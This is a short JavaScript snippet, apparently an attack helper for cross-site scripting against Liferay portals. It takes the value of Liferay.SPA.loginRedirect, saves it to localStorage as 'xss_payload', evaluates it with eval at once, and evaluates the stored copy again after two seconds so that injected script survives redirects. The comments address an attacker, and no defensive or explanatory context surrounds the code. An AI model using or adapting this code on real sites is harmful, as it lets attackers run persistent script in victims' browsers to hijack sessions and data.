// Store your payload persistently
localStorage.setItem('xss_payload', Liferay?.SPA?.loginRedirect || '');

// Try to execute it immediately
try {
  eval(Liferay?.SPA?.loginRedirect || '');
} catch (e) {}

// Try again after redirection or DOM change
setTimeout(() => {
  try {
    const stored = localStorage.getItem('xss_payload');
    if (stored) eval(stored);
  } catch (e) {}
}, 2000);
